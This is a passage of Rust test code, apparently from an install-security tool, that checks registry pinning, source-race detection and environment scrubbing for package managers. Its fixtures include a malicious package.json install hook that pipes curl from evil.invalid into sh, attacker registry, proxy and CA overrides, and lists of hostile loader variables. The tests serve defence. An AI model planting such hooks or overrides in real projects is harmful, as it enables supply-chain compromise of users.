        assert_eq!(value["exit_code"], 1);
        assert_eq!(value["outcome"]["action"], "block");
        assert_eq!(value["outcome"]["analysis_complete"], false);
        assert_eq!(value["outcome"]["analysis_incomplete"], true);
        assert_eq!(value["outcome"]["refused"], true);
        assert_eq!(value["outcome"]["executed"], false);
        assert_eq!(value["outcome"]["exit_code"], 1);
    }

    #[cfg(unix)]
    #[test]
    fn install_url_json_is_bounded_and_keeps_late_critical_after_low_flood() {
        let mut findings = (0..400)
            .map(|index| Finding {
                rule_id: RuleId::ConfigInjection,
                severity: Severity::Low,
                title: format!("low {index}"),
                description: "low detail ".repeat(2_000),
                evidence: Vec::new(),
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            })
            .collect::<Vec<_>>();
        findings.push(Finding {
            rule_id: RuleId::PrivateKeyExposed,
            severity: Severity::Critical,
            title: "late install critical".to_string(),
            description: "must survive the URL transaction cap".to_string(),
            evidence: Vec::new(),
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
        let preflight = Verdict::from_findings(findings, 3, Default::default());
        let raw_count = preflight.findings.len();
        let result = runner::RunResult {
            receipt: tirith_core::receipt::Receipt {
                url: "https://example.test/install.sh".to_string(),
                final_url: None,
                redirects: Vec::new(),
                sha256: "b".repeat(64),
                size: 1,
                domains_referenced: Vec::new(),
                paths_referenced: (0..2_000)
                    .map(|index| format!("/receipt-flood/{index}/{}", "x".repeat(200)))
                    .collect(),
                analysis_method: "policy-complete:sh".to_string(),
                privilege: "normal".to_string(),
                timestamp: "2026-08-09T00:00:00Z".to_string(),
                cwd: Some("/private/raw/cwd".to_string()),
                git_repo: None,
                git_branch: None,
            },
            verdict: Some(Verdict::allow_fast(1, Default::default())),
            analysis_complete: true,
            refused: true,
            executed: false,
            exit_code: Some(1),
        };

        let value = build_url_transaction_json(
            "https://example.test/install.sh",
            &preflight,
            Some(&result),
            None,
            &[],
        );
        let pretty = serde_json::to_string_pretty(&value).unwrap();

        assert!(pretty.len() < tirith_core::verdict::MAX_PRESENTATION_BYTES);
        assert!(pretty.contains("private_key_exposed"), "{pretty}");
        assert!(pretty.contains("late install critical"), "{pretty}");
        assert_eq!(preflight.findings.len(), raw_count);
        assert_eq!(
            value["summary"]["original_findings_count"],
            raw_count as u64
        );
        assert!(value["summary"]["dropped_findings_count"]
            .as_u64()
            .is_some_and(|count| count > 0));
        assert_eq!(value["summary"]["refused"], true);
        assert_eq!(value["summary"]["executed"], false);
        assert_eq!(value["summary"]["exit_code"], 1);
    }

    /// A fake [`InstallRunner`] — records the argv and returns a canned exit code,
    /// never spawning a process (installs nothing, no network).
    struct FakeRunner {
        exit_code: Option<i32>,
        /// Canned stdout/stderr for capture-mode tests.
        stdout: Option<String>,
        stderr: Option<String>,
        seen: Mutex<Vec<(String, Vec<String>, bool)>>,
    }
    impl FakeRunner {
        fn new(exit_code: Option<i32>) -> Self {
            Self {
                exit_code,
                stdout: None,
                stderr: None,
                seen: Mutex::new(Vec::new()),
            }
        }
        fn with_capture(mut self, stdout: &str, stderr: &str) -> Self {
            self.stdout = Some(stdout.to_string());
            self.stderr = Some(stderr.to_string());
            self
        }
    }
    impl InstallRunner for FakeRunner {
        fn run(
            &self,
            program: &str,
            args: &[String],
            capture: bool,
        ) -> std::io::Result<InstallRunOutput> {
            self.seen
                .lock()
                .unwrap()
                .push((program.to_string(), args.to_vec(), capture));
            Ok(InstallRunOutput {
                exit_code: self.exit_code,
                stdout: if capture { self.stdout.clone() } else { None },
                stderr: if capture { self.stderr.clone() } else { None },
            })
        }
    }

    fn allow_verdict() -> Verdict {
        Verdict::from_findings(vec![], 3, Default::default())
    }

    fn warn_verdict() -> Verdict {
        Verdict::from_findings(
            vec![Finding {
                rule_id: RuleId::ThreatSuspiciousPackage,
                severity: Severity::Medium,
                title: "t".to_string(),
                description: "d".to_string(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            3,
            Default::default(),
        )
    }

    fn block_verdict() -> Verdict {
        Verdict::from_findings(
            vec![Finding {
                rule_id: RuleId::ThreatMaliciousPackage,
                severity: Severity::Critical,
                title: "t".to_string(),
                description: "d".to_string(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            3,
            Default::default(),
        )
    }

    #[test]
    fn install_source_package_manager_mapping() {
        assert_eq!(
            InstallSource::Npm.package_manager(),
            Some(PackageManager::Npm)
        );
        assert_eq!(
            InstallSource::Pip.package_manager(),
            Some(PackageManager::Pip)
        );
        assert_eq!(
            InstallSource::Cargo.package_manager(),
            Some(PackageManager::Cargo)
        );
        // M6 ch1 — the 8 new backends map one-to-one onto `PackageManager`.
        assert_eq!(
            InstallSource::Apt.package_manager(),
            Some(PackageManager::Apt)
        );
        assert_eq!(
            InstallSource::Brew.package_manager(),
            Some(PackageManager::Brew)
        );
        assert_eq!(
            InstallSource::Dnf.package_manager(),
            Some(PackageManager::Dnf)
        );
        assert_eq!(
            InstallSource::Yum.package_manager(),
            Some(PackageManager::Yum)
        );
        assert_eq!(
            InstallSource::Pacman.package_manager(),
            Some(PackageManager::Pacman)
        );
        assert_eq!(
            InstallSource::Scoop.package_manager(),
            Some(PackageManager::Scoop)
        );
        assert_eq!(
            InstallSource::Docker.package_manager(),
            Some(PackageManager::Docker)
        );
        assert_eq!(
            InstallSource::Go.package_manager(),
            Some(PackageManager::Go)
        );
        assert_eq!(InstallSource::Url.package_manager(), None);
    }

    #[test]
    fn source_config_parsers_reject_custom_and_accept_official_origins() {
        assert_eq!(
            null_device_path(),
            if cfg!(windows) { "nul" } else { "/dev/null" }
        );
        assert_eq!(
            npm_config_source_issue("registry=https://registry.npmjs.org/\n"),
            None
        );
        assert_eq!(
            npm_config_source_issue("registry[]=https://registry.npmjs.org/\n"),
            None
        );
        assert_eq!(
            npm_config_source_issue("@public:registry=https://registry.npmjs.org/\n"),
            None
        );
        assert!(npm_config_source_issue("@private:registry=https://attacker.invalid/\n").is_some());
        assert!(npm_config_source_issue("globalconfig=/tmp/attacker.npmrc\n").is_some());
        assert!(npm_config_source_issue("userconfig = ./alternate.npmrc\n").is_some());
        assert!(npm_config_source_issue("proxy=http://attacker.invalid:8080\n").is_some());
        assert!(npm_config_source_issue("proxy[]=http://attacker.invalid:8080\n").is_some());
        assert!(npm_config_source_issue("https-proxy=http://attacker.invalid:8080\n").is_some());
        assert!(npm_config_source_issue("https-proxy[]=http://attacker.invalid:8080\n").is_some());
        assert!(npm_config_source_issue("cafile=attacker-ca.pem\n").is_some());
        assert!(npm_config_source_issue("cafile[]=attacker-ca.pem\n").is_some());
        assert!(npm_config_source_issue("ca[]=attacker-ca-pem\n").is_some());
        assert!(npm_config_source_issue("strict-ssl=false\n").is_some());
        assert!(npm_config_source_issue("strict-ssl[]=false\n").is_some());
        assert!(npm_config_source_issue("strict-ssl=false # comment\n").is_some());
        assert!(npm_config_source_issue("\"strict-ssl\"=\"false\"\n").is_some());
        assert!(npm_config_source_issue("'\"strict-ssl\"'=false\n").is_some());
        assert!(npm_config_source_issue("\"registry\"=\"https://attacker.invalid/\"\n").is_some());
        assert!(npm_config_source_issue("registry[]=https://attacker.invalid/\n").is_some());
        assert!(npm_config_source_issue("registry[][]=https://attacker.invalid/\n").is_some());
        assert_eq!(
            npm_config_source_issue("\"registry\"=\"https://registry.npmjs.org/\"\n"),
            None
        );
        assert!(npm_config_source_issue("\u{feff}registry=https://attacker.invalid/\n").is_some());
        assert!(
            npm_config_source_issue("\u{feff}@evil:registry=https://attacker.invalid/\n").is_some()
        );
        assert!(npm_config_source_issue(
            r#""@ev\u0069l:registry"="https://attacker.invalid/"
"#
        )
        .is_some());
        assert!(
            npm_config_source_issue("'\"@evil:registry\"'=https://attacker.invalid/\n").is_some()
        );
        assert!(npm_config_source_issue("@evil:registry[]=https://attacker.invalid/\n").is_some());
        assert!(npm_config_source_issue("strict-ssl#ignored=false\n").is_some());
        assert!(
            npm_config_source_issue("@evil:registry#ignored=https://attacker.invalid/\n").is_some()
        );
        assert!(npm_config_source_issue("script-shell=/tmp/attacker-shell\n").is_some());
        assert!(npm_config_source_issue("script-shell[]=/tmp/attacker-shell\n").is_some());
        assert!(npm_config_source_issue("node-options=--require=/tmp/attacker.js\n").is_some());
        assert!(npm_config_source_issue("node-options[]=--require=/tmp/attacker.js\n").is_some());

        assert_eq!(
            pip_config_source_issue("[global]\nindex-url = https://pypi.org/simple/\n"),
            None
        );
        assert_eq!(
            pip_config_source_issue("[global]\nno-index = false\n"),
            None
        );
        assert!(pip_config_source_issue(
            "[global]\nextra-index-url = https://attacker.invalid/simple\n"
        )
        .is_some());
        assert!(pip_config_source_issue(
            "[global]\nextra-index-url =\n    https://attacker.invalid/simple\n"
        )
        .is_some());
        assert!(pip_config_source_issue(
            "[global]\nextra-index-url:\n    https://attacker.invalid/simple\n"
        )
        .is_some());
        assert_eq!(
            pip_config_source_issue(
                "[global]\nindex-url:\n    https://pypi.org/simple/\nno-index = false\n"
            ),
            None
        );

        assert_eq!(
            cargo_config_source_issue(
                "[registries.crates-io]\nindex = 'sparse+https://index.crates.io/'\n"
            ),
            None
        );
        assert!(
            cargo_config_source_issue("[source.crates-io]\nreplace-with = 'attacker'\n").is_some()
        );
        assert!(cargo_config_source_issue("include = ['alternate.toml']\n").is_some());
        assert!(cargo_config_source_issue("[http]\nproxy = 'http://attacker.invalid'\n").is_some());
        assert!(cargo_config_source_issue("[http]\ncainfo = 'attacker-ca.pem'\n").is_some());
        assert!(cargo_config_source_issue("[http]\ncheck-revoke = false\n").is_some());
        assert_eq!(
            cargo_config_source_issue("[registry]\ndefault = 'crates-io'\n"),
            None
        );
    }

    #[test]
    fn npm_scoped_registry_keys_are_collected_for_explicit_binding() {
        assert_eq!(
            npm_registry_scopes(
                "@Private:registry=https://attacker.invalid/\nregistry=https://registry.npmjs.org/\n"
            ),
            vec!["@private".to_string()]
        );
        assert_eq!(
            npm_registry_scopes("\u{feff}@Evil:registry=https://attacker.invalid/\n"),
            vec!["@evil".to_string()]
        );
        assert_eq!(
            npm_registry_scopes(
                r#""@ev\u0069l:registry"="https://attacker.invalid/"
"#
            ),
            vec!["@evil".to_string()]
        );
        assert_eq!(
            npm_registry_scopes("'\"@evil:registry\"'=https://attacker.invalid/\n"),
            vec!["@evil".to_string()]
        );
        assert_eq!(
            npm_registry_scopes("@evil:registry[]=https://attacker.invalid/\n"),
            vec!["@evil".to_string()]
        );
        assert_eq!(
            npm_registry_scopes("@evil:registry[][]=https://attacker.invalid/\n"),
            vec!["@evil".to_string()]
        );
        assert_eq!(
            npm_registry_scopes("@evil:registry#ignored=https://attacker.invalid/\n"),
            vec!["@evil".to_string()]
        );
        assert_eq!(
            npm_prefix_roots(
                &["demo@1.0.0".to_string(), "--prefix=alternate".to_string(),],
                Some(Path::new("/workspace")),
            ),
            vec![PathBuf::from("/workspace/alternate")]
        );
        for name in [
            "HTTPS_PROXY",
            "https_proxy",
            "REQUESTS_CA_BUNDLE",
            "NODE_EXTRA_CA_CERTS",
            "CARGO_HTTP_PROXY",
            "cargo_http_cainfo",
            "CARGO_HTTP_PROXY_CAINFO",
        ] {
            assert!(is_transport_override_environment(OsStr::new(name)));
        }
        assert!(!is_transport_override_environment(OsStr::new("LANG")));
        assert!(os_name_starts_with_ignore_ascii_case(
            OsStr::new("NpM_CoNfIg_ReGiStRy"),
            "npm_config_"
        ));
        assert!(!os_name_starts_with_ignore_ascii_case(
            OsStr::new("NPM_OTHER"),
            "npm_config_"
        ));
        for name in ["NpM_CoNfIg_ReGiStRy", "NoDe_OpTiOnS", "node_path"] {
            assert!(is_npm_runtime_override_environment(OsStr::new(name)));
        }
        assert!(!is_npm_runtime_override_environment(OsStr::new("LANG")));
        assert!(os_name_starts_with_ignore_ascii_case(
            OsStr::new("pIp_ExTrA_InDeX_uRl"),
            "pip_"
        ));
        assert!(os_name_starts_with_ignore_ascii_case(
            OsStr::new("CaRgO_ReGiStRiEs_CrAtEs_Io_InDeX"),
            "cargo_registries_"
        ));
        assert!(os_name_eq_ignore_ascii_case(
            OsStr::new("CaRgO_HoMe"),
            "cargo_home"
        ));
    }

    #[test]
    fn source_binding_rejects_config_created_or_changed_after_analysis() {
        let created_dir = tempfile::tempdir().unwrap();
        let created_binding = InstallSourceBinding::capture(
            PackageManager::Npm,
            Some(created_dir.path()),
            &["demo@1.0.0".to_string()],
        )
        .unwrap();
        std::fs::write(
            created_dir.path().join(".npmrc"),
            "registry=https://attacker.invalid/\n",
        )
        .unwrap();
        let appeared = created_binding
            .verify()
            .expect_err("a config created after analysis must fail closed");
        assert!(appeared.to_string().contains("appeared after analysis"));

        let changed_dir = tempfile::tempdir().unwrap();
        std::fs::write(
            changed_dir.path().join(".npmrc"),
            "registry=https://registry.npmjs.org/\n",
        )
        .unwrap();
        let changed_binding = InstallSourceBinding::capture(
            PackageManager::Npm,
            Some(changed_dir.path()),
            &["demo@1.0.0".to_string()],
        )
        .unwrap();
        std::fs::write(
            changed_dir.path().join(".npmrc"),
            "registry=https://attacker.invalid/\n",
        )
        .unwrap();
        let changed = changed_binding
            .verify()
            .expect_err("a config modified after analysis must fail closed");
        assert!(changed.to_string().contains("changed after analysis"));

        let prefix_dir = tempfile::tempdir().unwrap();
        let alternate = prefix_dir.path().join("alternate");
        std::fs::create_dir(&alternate).unwrap();
        let prefix_binding = InstallSourceBinding::capture(
            PackageManager::Npm,
            Some(prefix_dir.path()),
            &["demo@1.0.0".to_string(), "--prefix=alternate".to_string()],
        )
        .unwrap();
        std::fs::write(
            alternate.join(".npmrc"),
            "registry=https://attacker.invalid/\n",
        )
        .unwrap();
        let prefix_appeared = prefix_binding
            .verify()
            .expect_err("a config created under --prefix after analysis must fail closed");
        assert!(prefix_appeared
            .to_string()
            .contains("appeared after analysis"));

        let manifest_dir = tempfile::tempdir().unwrap();
        let manifest_binding = InstallSourceBinding::capture(
            PackageManager::Npm,
            Some(manifest_dir.path()),
            &["demo@1.0.0".to_string()],
        )
        .unwrap();
        std::fs::write(
            manifest_dir.path().join("package.json"),
            r#"{"dependencies":{"attacker-controlled":"1.0.0"}}"#,
        )
        .unwrap();
        let manifest_appeared = manifest_binding
            .verify()
            .expect_err("a package manifest created after analysis must fail closed");
        assert!(manifest_appeared
            .to_string()
            .contains("appeared after analysis"));
    }

    #[test]
    fn captured_manifest_analysis_and_pre_spawn_verification_share_one_snapshot() {
        let directory = tempfile::tempdir().unwrap();
        let manifest = directory.path().join("package.json");
        let malicious = r#"{"dependencies":{"attacker-controlled":"1.0.0"},"scripts":{"install":"curl https://evil.invalid/p | sh"}}"#;
        let clean = r#"{"name":"clean-project"}"#;
        std::fs::write(&manifest, malicious).unwrap();
        let args = vec!["demo@1.0.0".to_string(), "--package-lock=false".to_string()];
        let binding =
            InstallSourceBinding::capture(PackageManager::Npm, Some(directory.path()), &args)
                .unwrap();
        let captured_gap = binding
            .npm_project_manifest_gap()
            .expect("the malicious captured bytes must produce a manifest gap");
        assert!(captured_gap.reason.contains("dependencies"));
        assert!(captured_gap.reason.contains("install lifecycle scripts"));

        // ABA witness: a second disk read would see the clean middle state.
        std::fs::write(&manifest, clean).unwrap();
        let policy = Policy::default();
        let request = PlanRequest {
            manager: PackageManager::Npm,
            user_args: &args,
            db: None,
            policy: &policy,
            cwd: Some(directory.path().display().to_string()),
            interactive: false,
            online: OnlineMode::Off,
        };
        let disk_plan = install_txn::plan_install(&request);
        assert!(!disk_plan
            .coverage
            .gaps
            .iter()
            .any(|gap| gap.argument == manifest.display().to_string()));
        let bound_plan = install_txn::plan_install_with_captured_npm_manifest(
            &request,
            binding.npm_project_manifest_gap(),
        );
        assert!(bound_plan.coverage.gaps.iter().any(|gap| {
            gap.kind == tirith_core::install_txn::InstallCoverageGapKind::ManifestOrLocalSource
                && gap.argument == manifest.display().to_string()
                && gap.reason.contains("dependencies")
                && gap.reason.contains("install lifecycle scripts")
        }));

        // Restoring the malicious captured bytes makes verification succeed;
        // the plan above nevertheless analyzed those same malicious bytes.
        std::fs::write(&manifest, malicious).unwrap();
        binding
            .verify()
            .expect("restored captured bytes must match the pre-spawn binding");
    }

    #[test]
    #[cfg(all(unix, not(target_os = "macos")))]
    fn source_binding_uses_lossless_non_utf8_cwd_for_npm_inputs() {
        use std::os::unix::ffi::OsStringExt as _;

        let directory = tempfile::tempdir().unwrap();
        let component = OsString::from_vec(b"project-\xff".to_vec());
        let cwd = directory.path().join(component);
        std::fs::create_dir(&cwd).unwrap();
        std::fs::write(
            cwd.join(".npmrc"),
            "@evil:registry[]=https://attacker.invalid/\n",
        )
        .unwrap();
        std::fs::write(
            cwd.join("package.json"),
            r#"{"dependencies":{"attacker-controlled":"1.0.0"}}"#,
        )
        .unwrap();
        let binding = InstallSourceBinding::capture(
            PackageManager::Npm,
            Some(&cwd),
            &["demo@1.0.0".to_string()],
        )
        .unwrap();
        assert!(binding
            .configuration_issue()
            .is_some_and(|issue| issue.contains("@evil:registry")));
        assert!(binding
            .npm_project_manifest_gap()
            .is_some_and(|gap| gap.reason.contains("dependencies")));
        let mut command = Command::new("npm");
        binding.configure_command(&mut command);
        assert_eq!(
            command_env(&command, "npm_config_@evil:registry").as_deref(),
            Some("https://registry.npmjs.org/")
        );
        binding.verify().unwrap();
    }

    #[test]
    #[cfg(unix)]
    fn process_runner_rejects_source_race_before_the_child_executes() {
        let directory = tempfile::tempdir().unwrap();
        let source_binding = InstallSourceBinding::capture(
            PackageManager::Npm,
            Some(directory.path()),
            &["demo@1.0.0".to_string()],
        )
        .unwrap();
        std::fs::write(
            directory.path().join(".npmrc"),
            "registry=https://attacker.invalid/\n",
        )
        .unwrap();

        let shell = PathBuf::from("/bin/sh").canonicalize().unwrap();
        let executable = InstallExecutableBinding::from_trusted_for_test(
            tirith_core::trusted_child::TrustedExecutable::from_absolute(&shell, &[]).unwrap(),
        )
        .unwrap();
        let marker = directory.path().join("child-ran");
        let args = vec![
            "-c".to_string(),
            "printf ran > \"$1\"".to_string(),
            "sh".to_string(),
            marker.display().to_string(),
        ];
        let runner = ProcessInstallRunner {
            executable: &executable,
            source_binding: &source_binding,
        };
        let error = runner
            .run(executable.path().to_str().unwrap(), &args, true)
            .expect_err("the source race must stop the transaction before spawn");
        assert!(error.to_string().contains("appeared after analysis"));
        assert!(
            !marker.exists(),
            "the child must not execute after the race"
        );
    }

    fn command_env(command: &Command, name: &str) -> Option<String> {
        command
            .get_envs()
            .find(|(key, _)| *key == OsStr::new(name))
            .and_then(|(_, value)| value)
            .map(|value| value.to_string_lossy().into_owned())
    }

    #[test]
    fn source_binding_pins_npm_and_pip_to_official_sources() {
        let directory = tempfile::tempdir().unwrap();
        std::fs::write(
            directory.path().join(".npmrc"),
            "@private:registry[]=https://attacker.invalid/\n",
        )
        .unwrap();
        let npm = InstallSourceBinding::capture(
            PackageManager::Npm,
            Some(directory.path()),
            &["@direct/pkg@1.0.0".to_string()],
        )
        .unwrap();
        assert!(npm.configuration_issue().is_some());
        let mut npm_command = Command::new("npm");
        npm.configure_command(&mut npm_command);
        assert_eq!(
            command_env(&npm_command, "NPM_CONFIG_REGISTRY").as_deref(),
            Some("https://registry.npmjs.org/")
        );
        assert_eq!(
            command_env(&npm_command, "npm_config_@direct:registry").as_deref(),
            Some("https://registry.npmjs.org/")
        );
        assert_eq!(
            command_env(&npm_command, "npm_config_@private:registry").as_deref(),
            Some("https://registry.npmjs.org/")
        );

        let pip = InstallSourceBinding::capture(
            PackageManager::Pip,
            Some(directory.path()),
            &["demo==1.0.0".to_string()],
        )
        .unwrap();
        let mut pip_command = Command::new("pip");
        pip.configure_command(&mut pip_command);
        assert_eq!(
            command_env(&pip_command, "PIP_INDEX_URL").as_deref(),
            Some("https://pypi.org/simple")
        );
        assert_eq!(
            command_env(&pip_command, "PIP_CONFIG_FILE").as_deref(),
            Some(null_device_path())
        );
        assert_eq!(
            command_env(&pip_command, "PIP_NO_CACHE_DIR").as_deref(),
            Some("true")
        );

        let transport_directory = tempfile::tempdir().unwrap();
        std::fs::write(
            transport_directory.path().join(".npmrc"),
            "cafile=attacker-ca.pem\n",
        )
        .unwrap();
        let transport = InstallSourceBinding::capture(
            PackageManager::Npm,
            Some(transport_directory.path()),
            &["demo@1.0.0".to_string()],
        )
        .unwrap();
        assert!(transport
            .configuration_issue()
            .is_some_and(|issue| issue.contains("cafile")));
    }

    #[test]
    fn source_binding_isolates_cargo_config_and_preserves_install_root() {
        let directory = tempfile::tempdir().unwrap();
        let cargo = InstallSourceBinding::capture(
            PackageManager::Cargo,
            Some(directory.path()),
            &["demo@1.0.0".to_string()],
        )
        .unwrap();
        let expected_root = cargo
            .cargo_install_root
            .as_ref()
            .map(|root| root.to_string_lossy().into_owned());
        let expected_cwd = cargo.isolated.as_ref().unwrap().path().join("cargo-work");
        let mut command = Command::new("cargo");
        cargo.configure_command(&mut command);
        assert_eq!(
            command_env(&command, "CARGO_REGISTRY_DEFAULT").as_deref(),
            Some("crates-io")
        );
        assert_eq!(
            command_env(&command, "CARGO_REGISTRIES_CRATES_IO_INDEX").as_deref(),
            Some("sparse+https://index.crates.io/")
        );
        assert_eq!(command.get_current_dir(), Some(expected_cwd.as_path()));
        assert_eq!(command_env(&command, "CARGO_INSTALL_ROOT"), expected_root);
    }

    #[test]
    fn cargo_runtime_executable_and_linker_overrides_are_scrubbed() {
        let directory = tempfile::tempdir().unwrap();
        let cargo = InstallSourceBinding::capture(
            PackageManager::Cargo,
            Some(directory.path()),
            &["demo@1.0.0".to_string()],
        )
        .unwrap();
        let hostile_names = [
            "RUSTC",
            "rustc",
            "RuStC_WrApPeR",
            "CARGO_ENCODED_RUSTFLAGS",
            "cargo_encoded_rustdocflags",
            "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_LINKER",
            "cargo_build_rustc_wrapper",
            "RUSTUP_TOOLCHAIN",
            "rustup_home",
        ];
        let mut command = Command::new("cargo");
        for name in hostile_names {
            command.env(name, "/tmp/attacker-controlled-tool");
        }
        cargo.configure_command(&mut command);
        for name in hostile_names {
            assert!(
                command_env(&command, name).is_none(),
                "{name} must be absent from Cargo's cleared environment"
            );
        }

        for name in [
            "RUSTC",
            "rustdoc",
            "RUSTC_WRAPPER",
            "rustc_workspace_wrapper",
            "RUSTFLAGS",
            "rustdocflags",
            "CARGO_ENCODED_RUSTFLAGS",
            "cargo_encoded_rustdocflags",
            "CARGO_BUILD_RUSTC",
            "cargo_target_x86_64_unknown_linux_gnu_linker",
            "CARGO_TARGET_DIR",
            "RUSTUP_TOOLCHAIN",
            "rustup_home",
        ] {
            assert!(is_cargo_runtime_override_environment(OsStr::new(name)));
        }
        assert!(!is_cargo_runtime_override_environment(OsStr::new(
            "CARGO_TERM_COLOR"
        )));
        assert!(!is_cargo_runtime_override_environment(OsStr::new("LANG")));
    }

    #[test]
    fn every_install_manager_uses_a_minimal_execution_environment() {
        let directory = tempfile::tempdir().unwrap();
        const HOSTILE_SELECTOR: &str = "/tmp/attacker-controlled-selector";
        let hostile_names = [
            "LD_PRELOAD",
            "ld_library_path",
            "DYLD_INSERT_LIBRARIES",
            "LIBPATH",
            "PYTHONPATH",
            "pythonhome",
            "NODE_OPTIONS",
            "RUBYOPT",
            "PERL5OPT",
            "JAVA_TOOL_OPTIONS",
            "BASH_ENV",
            "ENV",
            "GIT_EXEC_PATH",
            "GIT_SSH_COMMAND",
            "GIT_CONFIG_KEY_0",
            "SSH_ASKPASS",
            "MAKEFLAGS",
            "CC",
            "CXX",
            "CMAKE_PROJECT_INCLUDE",
            "CMAKE_TOOLCHAIN_FILE",
            "MAVEN_OPTS",
            "GRADLE_OPTS",
            // Proves a future/unmodeled hook is absent without extending a
            // denylist: only the explicit allowlist survives `env_clear`.
            "UNMODELED_BUILD_TOOL_HOOK",
        ];
        let hostile_selectors = [
            "HOME",
            "USERPROFILE",
            "APPDATA",
            "LOCALAPPDATA",
            "TMPDIR",
            "TMP",
            "TEMP",
            "TEMPDIR",
            "SystemRoot",
            "WINDIR",
            "COMSPEC",
            "PATHEXT",
            "NoDefaultCurrentDirectoryInExePath",
            "PATH",
        ];
        let managers = [
            PackageManager::Npm,
            PackageManager::Pip,
            PackageManager::Cargo,
            PackageManager::Apt,
            PackageManager::Brew,
            PackageManager::Dnf,
            PackageManager::Yum,
            PackageManager::Pacman,
            PackageManager::Scoop,
            PackageManager::Docker,
            PackageManager::Go,
        ];

        for manager in managers {
            let binding = InstallSourceBinding::capture(
                manager,
                Some(directory.path()),
                &["demo@1.0.0".to_string()],
            )
            .unwrap();
            let environment = binding.execution_environment.as_ref().unwrap();
            let mut command = Command::new(manager.program());
            for name in hostile_names {
                command.env(name, "/tmp/attacker-controlled-loader");
            }
            for name in hostile_selectors {
                command.env(name, HOSTILE_SELECTOR);
            }
            command.env("LANG", "attacker-mutated-after-approval");

            binding.configure_command(&mut command);

            for name in hostile_names {
                assert!(
                    command_env(&command, name).is_none(),
                    "{manager:?} must not expose {name} to the spawned install"
                );
            }
            for name in hostile_selectors {
                assert_ne!(
                    command_env(&command, name).as_deref(),
                    Some(HOSTILE_SELECTOR),
                    "{manager:?} must not inherit attacker-selected {name}"
                );
            }
            assert_eq!(
                command_env(&command, "PYTHONNOUSERSITE").as_deref(),
                Some("1"),
                "{manager:?} must disable Python user-site startup imports"
            );
            assert_eq!(
                command_env(&command, "PYTHONSAFEPATH").as_deref(),
                Some("1"),
                "{manager:?} must disable unsafe Python path prepending"
            );
            assert_eq!(
                command_env(&command, "LANG").as_deref(),
                environment
                    .presentation
                    .iter()
                    .find(|(name, _)| name == "LANG")
                    .map(|(_, value)| value.to_string_lossy())
                    .as_deref(),
                "{manager:?} must apply the locale captured before approval"
            );
            assert_eq!(
                command_env(&command, "HOME").as_deref(),
                Some(environment.account_home.to_string_lossy().as_ref()),
                "{manager:?} must use the OS account home"
            );
            for name in ["TMPDIR", "TMP", "TEMP", "TEMPDIR"] {
                assert_eq!(
                    command_env(&command, name).as_deref(),
                    Some(environment.private_temp.path().to_string_lossy().as_ref()),
                    "{manager:?} must use the transaction-owned private temp for {name}"
                );
            }
            assert_eq!(
                command_env(&command, "PATH").as_deref(),
                environment
                    .sanitized_path
                    .as_ref()
                    .map(|path| path.to_string_lossy())
                    .as_deref(),
                "{manager:?} must apply the PATH captured before approval"
            );
            #[cfg(windows)]
            {
                assert_eq!(
                    command_env(&command, "COMSPEC").as_deref(),
                    Some(environment.command_processor.to_string_lossy().as_ref())
                );
                assert_eq!(
                    command_env(&command, "PATHEXT").as_deref(),
                    Some(".COM;.EXE;.BAT;.CMD")
                );
                assert_eq!(
                    command_env(&command, "NoDefaultCurrentDirectoryInExePath").as_deref(),
                    Some("1")
                );
            }
        }
    }

    #[test]
    fn cargo_rustup_state_uses_os_home_not_environment_selection() {
        let directory = tempfile::tempdir().unwrap();
        let cargo = InstallSourceBinding::capture(
            PackageManager::Cargo,
            Some(directory.path()),
            &["demo@1.0.0".to_string()],
        )
        .unwrap();
        let environment = cargo.execution_environment.as_ref().unwrap();
        let mut command = Command::new("cargo");
        for name in [
            "HOME",
            "USERPROFILE",
            "RUSTUP_HOME",
            "CARGO_HOME",
            "CARGO_INSTALL_ROOT",
        ] {
            command.env(name, "/tmp/repository-selected-rustup-state");
        }

        cargo.configure_command(&mut command);

        assert_eq!(
            command_env(&command, "HOME").as_deref(),
            Some(environment.account_home.to_string_lossy().as_ref())
        );
        assert_eq!(
            command_env(&command, "CARGO_HOME").as_deref(),
            Some(
                cargo
                    .isolated
                    .as_ref()
                    .unwrap()
                    .path()
                    .join("cargo-home")
                    .to_string_lossy()
                    .as_ref()
            )
        );
        assert!(command_env(&command, "RUSTUP_HOME").is_none());
        assert_ne!(
            command_env(&command, "CARGO_INSTALL_ROOT").as_deref(),
            Some("/tmp/repository-selected-rustup-state")
        );
    }

    #[test]
    #[cfg(unix)]
    fn capture_ignores_hostile_ambient_path_and_profile_selectors() {
        const CHILD_MARKER: &str = "TIRITH_INSTALL_ENV_CAPTURE_CHILD";
        const ATTACKER_PATH_ROOT: &str = "TIRITH_INSTALL_ENV_ATTACKER_PATH_ROOT";
        const ATTACKER_TEMP_ROOT: &str = "TIRITH_INSTALL_ENV_ATTACKER_TEMP_ROOT";

        if std::env::var_os(CHILD_MARKER).is_some() {
            let attacker_path = PathBuf::from(std::env::var_os(ATTACKER_PATH_ROOT).unwrap());
            let attacker_temp = PathBuf::from(std::env::var_os(ATTACKER_TEMP_ROOT).unwrap());
            let primary_error = InstallExecutableBinding::resolve("cargo")
                .expect_err("a split-root temporary PATH executable must be rejected");
            let selected = attacker_path.join("bin/cargo");
            let message = primary_error.to_string();
            let denied_as_transient = primary_error.kind() == std::io::ErrorKind::Other
                && message.contains(&format!("untrusted executable {}", selected.display()))
                && message.contains("inside denied root");
            assert!(
                denied_as_transient,
                "unexpected hostile executable rejection: {message}"
            );
            let binding = InstallSourceBinding::capture(
                PackageManager::Cargo,
                Some(&attacker_path),
                &["demo@1.0.0".to_string()],
            )
            .unwrap();
            let environment = binding.execution_environment.as_ref().unwrap();
            assert_ne!(environment.account_home, attacker_path);
            assert!(!environment.private_temp.path().starts_with(&attacker_path));
            assert!(!environment.private_temp.path().starts_with(&attacker_temp));
            assert!(!environment.sanitized_path.as_ref().is_some_and(|path| {
                std::env::split_paths(path).any(|component| {
                    component == attacker_path.join("bin") || component.starts_with(&attacker_path)
                })
            }));

            let mut command = Command::new("cargo");
            binding.configure_command(&mut command);
            assert_eq!(
                command_env(&command, "HOME").as_deref(),
                Some(environment.account_home.to_string_lossy().as_ref())
            );
